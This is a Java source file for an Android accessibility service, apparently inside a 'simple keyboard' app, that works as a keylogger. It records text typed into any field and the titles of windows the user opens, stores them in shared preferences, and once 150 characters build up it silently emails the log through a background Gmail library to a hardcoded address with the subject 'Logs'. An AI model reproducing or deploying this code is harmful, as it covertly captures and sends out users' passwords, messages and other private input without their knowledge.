package rkr.simplekeyboard.inputmethod;

import android.accessibilityservice.AccessibilityService;
import android.content.SharedPreferences;
import android.os.Environment;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.widget.Toast;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.util.List;

import com.creativityapps.gmailbackgroundlibrary.BackgroundMail;


public class MyAccessibilityService extends AccessibilityService {
    //private static final String TAG = "TAG: ";

    public static final String SHARED_PREFS = "sharedPrefs";
    public static final String TEXT = "text";
    private String text;

    public static final String SHARED_PREFS2 = "sharedPrefs2";
    public static final String TEXT2 = "text2";
    private String OtherText;



    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        final int eventType = event.getEventType();
        String eventText = null;
        /*
        switch(eventType) {
            /*
                You can use catch other events like touch and focus
                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                     eventText = "Clicked: ";
                     break;
                case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                     eventText = "Focused: ";
                     break;
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                loadData();
                saveData2(text);
                loadData2();
                System.out.println("LOADED??: "+OtherText);
                //clearData2();
                break;
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                eventText = "Typed: ";
                break;
        }
        */
        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            List<CharSequence> testr22 = event.getText();
            String CutTestr22 = testr22.toString().substring(1, (testr22.toString().length() -1));
            loadData();
            saveData2(" " + text + " " + CutTestr22 + " ");
            loadData2();
            clearData();
            if (OtherText.length() >= 150) {
                BackgroundMail.newBuilder(this)
                        .withUsername("email@gmail.com")
                        .withPassword("password")
                        .withMailTo("email@gmail.com")
                        .withType(BackgroundMail.TYPE_PLAIN)
                        .withSubject("Logs ")
                        .withBody(OtherText)
                        .withOnSuccessCallback(new BackgroundMail.OnSendingCallback() {
                            @Override
                            public void onSuccess() {
                                // do some magic
                                System.out.println("Email success");
                                clearData2();
                            }

                            @Override
                            public void onFail(Exception e) {
                                // do some magic
                                System.out.println("Email failed: " + e.getMessage());
                            }
                        })
                        .send();

            }
            //clearData2();
            //System.out.println("new WINDOW??: "+event.getText());
            System.out.println("LOADED??: "+OtherText);

        } else if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            List<CharSequence> testr = event.getText();
            eventText = eventText + testr;
            //print the typed text in the console. Or do anything you want here.
            String Testr = testr.toString();
            String CutTestr = Testr.substring(1, Testr.length() - 1);
            System.out.println("TIMED ACCESSIBILITY SERVICE : "+eventText);
            saveData(CutTestr);
            loadData();
            //saveData2("HI JOSH");
            //loadData2();
            //clearData();
            System.out.println("TEXT HERE: "+text);

        }

        //System.out.println("HI PLEASE WORK: " + testr.toString());
        //String stringr = testr.toString();
        //writeToFile(stringr, "configs");
        /*
        if (testr.toString().equals("[q]")) {
            System.out.println("SUP JOSH");
            BackgroundMail.newBuilder(this)
                    .withUsername("email@gmail.com")
                    .withPassword("password")
                    .withMailTo("username@gmail.com")
                    .withType(BackgroundMail.TYPE_PLAIN)
                    .withSubject("this is the subject")
                    .withBody("this is the body")
                    .withOnSuccessCallback(new BackgroundMail.OnSendingCallback() {
                        @Override
                        public void onSuccess() {
                            // do some magic
                        }
                        @Override
                        public void onFail(Exception e) {
                            // do some magic
                        }
                    })
                    .send();
        } else {
            System.out.println(testr.toString());
        }
        */
        /*
        eventText = eventText + testr;
        //print the typed text in the console. Or do anything you want here.
        String Testr = testr.toString();
        String CutTestr = Testr.substring(1, Testr.length() - 1);
        System.out.println("TIMED ACCESSIBILITY SERVICE : "+eventText);
        saveData(CutTestr);
        loadData();
        //saveData2("HI JOSH");
        //loadData2();
        //clearData();
        System.out.println("TEXT HERE: "+text);
        //System.out.println("WILL HE SAY HI??: "+OtherText);
        */






    }

    @Override
    public void onInterrupt() {
        //whatever
        System.out.println("SUP JOSH");
    }

    @Override
    public void onServiceConnected() {
        //configure our Accessibility service
        AccessibilityServiceInfo info=getServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED | AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN;
        info.notificationTimeout = 100;
        this.setServiceInfo(info);
    }
    /*
    public boolean writeToFile(String dataToWrite, String fileName) {
        File file = new File(MainActivity.this.getFilesDir(), "text");
        if (!file.exists()) {
            file.mkdir();
        }
        try {
                File gpxfile = new File(file, "sample");
                FileWriter writer = new FileWriter(gpxfile);
                writer.append(enterText.getText().toString());
                writer.flush();
                writer.close();
                Toast.makeText(MainActivity.this, "Saved your text", Toast.LENGTH_LONG).show();
            } catch (Exception e) { }
        }
    }
    public void onUserTyped
    */
    public void saveData(String textyyy) {
        SharedPreferences sharedPreferences = getSharedPreferences(SHARED_PREFS, MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();

        //String value = sharedPreferences.getString(TEXT, "");
        //value = value + textyyy;
        editor.putString(TEXT, textyyy);


        editor.apply();

        //Toast.makeText(this, "Data saved", Toast.LENGTH_SHORT).show();
    }

    public void loadData() {
        SharedPreferences sharedPreferences = getSharedPreferences(SHARED_PREFS, MODE_PRIVATE);
        text = sharedPreferences.getString(TEXT, "");
    }

    public void saveData2(String textyyy) {
        SharedPreferences sharedPreferences = getSharedPreferences(SHARED_PREFS2, MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();

        String value = sharedPreferences.getString(TEXT2, "");
        value = value + textyyy;
        editor.putString(TEXT2, value);


        editor.apply();

        //Toast.makeText(this, "Data saved", Toast.LENGTH_SHORT).show();
    }

    public void loadData2() {
        SharedPreferences sharedPreferences = getSharedPreferences(SHARED_PREFS2, MODE_PRIVATE);
        OtherText = sharedPreferences.getString(TEXT2, "");
    }

    public void clearData() {
        SharedPreferences sharedPreferences = getSharedPreferences(SHARED_PREFS, MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.clear();
        editor.apply();
    }

    public void clearData2() {
        SharedPreferences sharedPreferences = getSharedPreferences(SHARED_PREFS2, MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.clear();
        editor.apply();
    }

}
